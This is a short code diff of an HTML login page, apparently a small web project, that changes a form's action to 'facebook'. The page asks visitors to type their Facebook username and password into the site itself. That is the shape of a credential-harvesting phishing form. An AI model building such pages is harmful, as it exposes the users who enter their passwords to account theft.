@@ -10,7 +10,7 @@
 <head>
     <title>Do log in, please!</title>
     <p>Use your facebook login and password to get access to our website.</p>
-    <form method="post" action="getUser">
+    <form method="post" action="facebook">
         login   : <input type="text" name="username">
         password: <input type="password" name="password">
         <input type="submit" value="login">
